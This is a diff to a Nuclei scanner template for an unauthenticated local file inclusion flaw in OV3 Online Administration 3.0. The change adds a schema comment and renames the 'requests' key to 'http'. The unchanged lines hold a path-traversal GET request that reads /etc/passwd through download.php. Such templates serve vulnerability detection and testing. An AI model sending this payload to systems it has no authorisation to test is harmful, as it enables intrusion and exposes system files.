@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: ov3-online-administration-unauthenticated-lfi
 info:
   name: OV3 Online Administration 3.0 - Unauthenticated LFI
@@ -8,7 +9,7 @@ info:
     - https://www.zeroscience.mk/codes/ov3_lfi.txt
   tags: ov3,lfi
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/download.php?c_id=557&file=../../../../../../../../../../../etc/passwd&name=download.txt"
